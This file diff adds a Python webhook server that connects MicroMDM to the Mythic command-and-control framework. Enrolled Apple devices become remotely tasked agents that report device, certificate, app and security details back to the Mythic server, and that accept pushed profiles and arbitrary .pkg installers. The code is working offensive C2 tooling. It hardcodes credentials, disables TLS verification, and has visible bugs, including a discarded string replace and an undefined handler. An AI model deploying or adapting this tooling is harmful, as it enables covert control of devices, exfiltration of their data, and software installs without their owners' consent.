@@ -1,0 +1,419 @@
+#!/usr/bin/env python3
+
+from sanic import Sanic
+from sanic.response import html, redirect, text, raw
+from sanic.exceptions import NotFound
+import sys
+import asyncio
+import ssl
+from pathlib import Path
+
+# rookuu's imports
+from base64 import b64decode, b64encode
+from time import sleep
+import requests
+import json
+import os
+import subprocess
+import plistlib
+import random
+import string
+import threading
+
+config = {}
+agents = {}
+mdm_host = None
+lock = None
+
+async def print_flush(message):
+    print(message)
+    sys.stdout.flush()
+
+
+def server_error_handler(request, exception):
+    if request is None:
+        print("Invalid HTTP Method - Likely HTTPS trying to talk to HTTP")
+        sys.stdout.flush()
+        return html("Error: Failed to process request", status=500, headers={})
+    return html("Error: Requested URL {} not found".format(request.url), status=404, headers=config[request.app.name]['headers'])
+
+
+
+async def agent_message(request, **kwargs):
+    global config
+    global agents
+    global mdm_host
+    global lock
+
+    try:
+        if config[request.app.name]['debug']:
+            await print_flush("agent_message request from: {} with {} and {}".format(request.url, request.cookies, request.headers))
+            await print_flush(request.json)
+
+        if request.method == "POST":
+            if request.json['topic'] == 'mdm.Authenticate':
+
+                # First time we've seen an agent.
+                payload = plistlib.loads(b64decode(request.json['checkin_event']['raw_payload']))
+
+                await print_flush(payload)
+
+                # Issue: We need to keep track of our payloads. A specific callback, needs to be tied to a specific payload. This is not natively possible with mdm, as we don't control the data being sent. 
+                # Fix: Embed some data in an installed profile then immediately query to see if that profile exists!
+
+                udid = payload['UDID']
+
+                if udid not in agents:
+                    agents[udid] = {}
+
+                agents[udid]['os'] = payload['OSVersion']  
+                agents[udid]['host'] = payload['DeviceName']
+                agents[udid]['tasks'] = {}   
+
+                with lock:
+                    with open("agents.json", "w") as f:
+                        json.dump(agents, f)                 
+
+                # Query profile
+                await asyncio.sleep(1)
+                
+                command = {
+                    "udid": udid,
+                    "request_type": "ProfileList"
+                }
+
+                r = requests.post("https://localhost/v1/commands", auth=('micromdm', 'mythic'), json=command, verify=False)
+
+            elif request.json['topic'] == 'mdm.TokenUpdate':
+                payload = plistlib.loads(b64decode(request.json['checkin_event']['raw_payload']))
+
+            elif request.json['topic'] == 'mdm.Connect':
+                # Agent is returning data for some command.
+                payload = plistlib.loads(b64decode(request.json['acknowledge_event']['raw_payload']))
+                await print_flush(payload)
+
+                if payload['Status'] == 'Acknowledged':
+                    if "ProfileList" in payload:
+                        for profile in payload['ProfileList']:
+                            for payload_content in profile['PayloadContent']:
+                                if payload_content['PayloadType'] == "com.apple.mdm":
+                                    payload_uuid = payload_content['PayloadDisplayName']
+                                    await print_flush("Found payload ID: {}".format(payload_uuid))
+                                    break
+
+                        udid = payload['UDID']
+
+                        if "callback_uuid" not in agents[udid]:
+                            # Check if we've already seen that payload ID, if not then we need to do a first checkin.
+                            agents[udid]['payload_uuid'] = payload_uuid
+
+                            checkin_payload = {
+                                "action": "checkin", 
+                                "ip": "127.0.0.1", 
+                                "os": agents[udid]['os'], 
+                                "user": "mdmclient", 
+                                "host": agents[udid]['host'], 
+                                "pid": 0, 
+                                "uuid": payload_uuid,
+                            }
+                            
+                            checkin = b64encode((payload_uuid + json.dumps(checkin_payload)).encode())
+
+                            mythic_response = requests.post(config['mythic_address'], data=checkin, headers={"Mythic": "mdm"}, verify=False)
+                            decoded_mythic_response = json.loads(b64decode(mythic_response.text)[36:])
+
+                            agents[udid]['callback_uuid'] = decoded_mythic_response['id']
+
+                            with lock:
+                                with open("agents.json", "w") as f:
+                                    json.dump(agents, f)  
+
+                            await print_flush("Connect back from payload, assigned {}".format(decoded_mythic_response['id']))
+                        else:
+                            # Handle an actual tasking of ProfileList
+
+                            task_uuid = agents[udid]['tasks'][payload['CommandUUID']]
+                            callback_uuid = agents[udid]['callback_uuid']
+
+                            post_response_payload = {
+                                "action": "post_response",
+                                "responses": [
+                                    {
+                                        "task_id": task_uuid,
+                                        "user_output": json.dumps(payload, default=str, indent=4, sort_keys=True),
+                                        "completed": True
+                                    }
+                                ]
+                            }
+
+                            checkin = b64encode((agents[udid]['callback_uuid'] + json.dumps(post_response_payload)).encode())
+
+                            mythic_response = requests.post(config['mythic_address'], data=checkin, headers={"Mythic": "mdm"}, verify=False)
+                            decoded_mythic_response = json.loads(b64decode(mythic_response.text)[36:])
+
+                            await print_flush(decoded_mythic_response)
+
+                            del agents[udid]['tasks'][payload['CommandUUID']]
+                    else:
+                        # Every other command comes through here.
+                        # We need to take the response, map back to the mythic task uuids, and build a post_response request back to mythic.
+                        await print_flush(payload)
+
+                        udid = payload['UDID']
+
+                        if payload['CommandUUID'] not in agents[udid]['tasks']:
+                            await print_flush("ERROR: This command wasn't linked to a task launched from Mythic. Not reporting output.")
+                            return raw('', status=200)
+
+                        task_uuid = agents[udid]['tasks'][payload['CommandUUID']]
+                        callback_uuid = agents[udid]['callback_uuid']
+
+                        post_response_payload = {
+                            "action": "post_response",
+                            "responses": [
+                                {
+                                    "task_id": task_uuid,
+                                    "user_output": json.dumps(payload, default=str, indent=4, sort_keys=True),
+                                    "completed": True
+                                }
+                            ]
+                        }
+
+                        checkin = b64encode((agents[udid]['callback_uuid'] + json.dumps(post_response_payload)).encode())
+
+                        mythic_response = requests.post(config['mythic_address'], data=checkin, headers={"Mythic": "mdm"}, verify=False)
+                        decoded_mythic_response = json.loads(b64decode(mythic_response.text)[36:])
+
+                        await print_flush(decoded_mythic_response)
+
+                        del agents[udid]['tasks'][payload['CommandUUID']]
+
+                        with lock:
+                            with open("agents.json", "w") as f:
+                                json.dump(agents, f)  
+
+                elif payload['Status'] == "Idle":
+                    payload = plistlib.loads(b64decode(request.json['acknowledge_event']['raw_payload']))
+                    udid = payload['UDID']
+
+                    get_tasking_payload = {
+                        "action": "get_tasking", 
+                        "tasking_size": -1
+                    }
+
+                    checkin = b64encode((agents[udid]['callback_uuid'] + json.dumps(get_tasking_payload)).encode())
+
+                    mythic_response = requests.post(config['mythic_address'], data=checkin, headers={"Mythic": "mdm"}, verify=False)
+                    decoded_mythic_response = json.loads(b64decode(mythic_response.text)[36:])
+
+                    await print_flush(decoded_mythic_response)
+                    
+                    for task in decoded_mythic_response['tasks']:
+                        if task['command'] == "device_information":
+                            task_json = {
+                                "udid": udid,
+                                "request_type": "DeviceInformation",
+                                "queries": []
+                            }
+
+                        elif task['command'] == 'certificate_list':
+                            task_json = {
+                                "udid": udid,
+                                "request_type": "CertificateList"
+                            }
+                            
+                        elif task['command'] == 'installed_application_list':
+                            task_json = {
+                                "udid": udid,
+                                "request_type": "InstalledApplicationList"
+                            }
+                            
+                        elif task['command'] == 'profile_list':
+                            task_json = {
+                                "udid": udid,
+                                "request_type": "ProfileList"
+                            }
+                            
+                        elif task['command'] == 'provisioning_profile_list':
+                            task_json = {
+                                "udid": udid,
+                                "request_type": "ProvisioningProfileList"
+                            }
+                            
+                        elif task['command'] == 'security_info':
+                            task_json = {
+                                "udid": udid,
+                                "request_type": "SecurityInfo"
+                            }
+                            
+                        elif task['command'] == 'install_profile':
+                            print(task)
+                            task_json = {
+                                "udid": udid,
+                                "request_type": "InstallProfile",
+                                "payload": json.loads(task['parameters'])['file']
+                            }
+                        elif task['command'] == 'install_pkg':
+                            # First, take the signed pkg file and move it to /pkg
+                            signed_pkg = json.loads(task['parameters'])['file']
+                            signed_pkg_name = ''.join(random.choice(string.ascii_letters) for i in range(8)) 
+
+                            with open("/pkg/{}.pkg".format(signed_pkg_name), "wb") as f:
+                                f.write(b64decode(signed_pkg))
+
+                            # Then, use mdmctl apply to generate a manifest file, or do it yourself.
+                            p = subprocess.Popen([
+                                "/build/linux/mdmctl",
+                                "apply", "app",
+                                "-pkg", "/pkg/{}.pkg".format(signed_pkg_name),
+                                "-pkg-url", "https://{}/repo/{}.pkg".format(mdm_host, signed_pkg_name),
+                                "-upload"
+                            ])
+                            p.communicate()
+
+                            with open("/pkg/{}.plist".format(signed_pkg_name), "r") as f:
+                                plist = f.read()
+
+                            plist.replace("localhost", mdm_host)
+
+                            with open("/pkg/{}.plist".format(signed_pkg_name), "w") as f:
+                                f.write(plist)
+
+                            task_json = {
+                                "udid": udid,
+                                "request_type": "InstallApplication",
+                                "manifest_url": "https://{}/repo/{}.plist".format(mdm_host, signed_pkg_name)
+                            }
+
+                        r = requests.post("https://localhost/v1/commands", auth=('micromdm', 'mythic'), json=task_json, verify=False)
+
+                        # Create a mapping between MicroMDM command UUIDs and Mythic task UUIDs.
+                        command_uuid = r.json()['payload']['command_uuid']
+                        
+                        agents[udid]['tasks'][command_uuid] = task['id']
+
+                        with lock:
+                            with open("agents.json", "w") as f:
+                                json.dump(agents, f)  
+                        
+
+            elif request.json['topic'] == "mythic.force_callback":
+                callback_uuid = request.json['callback_uuid']
+                udid = None
+
+                await print_flush(request.json)
+
+                for agent_udid, agent in agents.items():
+                    if agent['callback_uuid'] == callback_uuid:
+                        udid = agent_udid
+                        break
+
+                if not udid:
+                    raise Exception("Agent not found")
+
+                await print_flush("Forced callback for {} ({})".format(callback_uuid, udid))
+
+                r = requests.get("https://localhost/push/{}".format(udid), auth=('micromdm', 'mythic'), verify=False)          
+
+        return raw('', status=200)
+
+    except Exception as e:
+        if config[request.app.name]['debug']:
+            await print_flush("error in agent_message: {}".format(str(e)))
+
+        return await no_match(request, NotFound)
+
+
+
+if __name__ == "__main__":
+    sys.path.append("/Mythic/mythic")
+
+    from mythic_c2_container.C2ProfileBase import *
+    from mythic_c2_container.MythicCallbackRPC import *
+
+    config_file = open("config.json", 'rb')
+    main_config = json.loads(config_file.read().decode('utf-8'))
+
+    print("Opening config and starting mdm...")
+    sys.stdout.flush()
+
+    # basic mapping of the general endpoints to the real endpoints
+    try:
+        config['mythic_address'] = os.environ['MYTHIC_ADDRESS']
+    except Exception as e:
+        print("failed to find MYTHIC_ADDRESS environment variable")
+        sys.stdout.flush()
+        sys.exit(1)
+
+    config[str(main_config['webhook_port'])] = {'debug': main_config['debug']}
+
+    if main_config['debug']:
+        print("Debugging statements are enabled. This gives more context, but might be a performance hit")
+    else:
+        print("Debugging statements are disabled")
+
+    sys.stdout.flush()
+
+    with open("/certs/mdm.crt", "wb") as f:
+        f.write(b64decode(main_config['tls_cert']))
+
+    with open("/certs/mdm.key", "wb") as f:
+        f.write(b64decode(main_config['tls_key']))
+
+    mdm_host = main_config['mdm_host']
+
+    # load agents]
+    lock = threading.Lock()
+
+    if os.path.exists("agents.json"):
+        with open("agents.json", "r") as f:
+            agents = json.load(f)
+
+    os.system("cp /var/db/micromdm/micromdm.db /Mythic/micromdm.db")
+    os.system("ln -sf /Mythic/micromdm.db /var/db/micromdm/micromdm.db")
+
+    # start mdm
+    p = subprocess.Popen([
+        "/build/linux/micromdm", "serve",
+        "-server-url=https://{}".format(main_config['mdm_host']),
+        "-api-key", "mythic",
+        "-tls-cert", "/certs/mdm.crt",
+        "-tls-key", "/certs/mdm.key",
+        "-filerepo", "/pkg",
+        "-command-webhook-url", "http://localhost:{}/webhook".format(main_config['webhook_port'])
+    ])
+
+    # now to create an app to handle webhook
+    app = Sanic(str(main_config['webhook_port']))
+    app.config['REQUEST_MAX_SIZE'] = 1000000000
+    app.config['REQUEST_TIMEOUT'] = 600
+    app.config['RESPONSE_TIMEOUT'] = 600
+
+    app.add_route(agent_message, "/webhook", methods=['GET', 'POST'])
+
+    app.error_handler.add(Exception, server_error_handler)
+
+    if main_config['debug']:
+        server = app.create_server(host="127.0.0.1", port=main_config['webhook_port'], debug=True, return_asyncio_server=True, access_log=True)
+    else:
+        server = app.create_server(host="127.0.0.1", port=main_config['webhook_port'], debug=False, return_asyncio_server=True, access_log=False)
+
+    task = asyncio.ensure_future(server)
+
+    try:
+        loop = asyncio.get_event_loop()
+
+        def callback(fut):
+            try:
+                fetch_count = fut.result()
+            except:
+                print("port already in use")
+                sys.stdout.flush()
+                sys.exit()
+
+        task.add_done_callback(callback)
+        loop.run_forever()
+    except:
+        sys.stdout.flush()
+        sys.exit()
+        loop.stop()
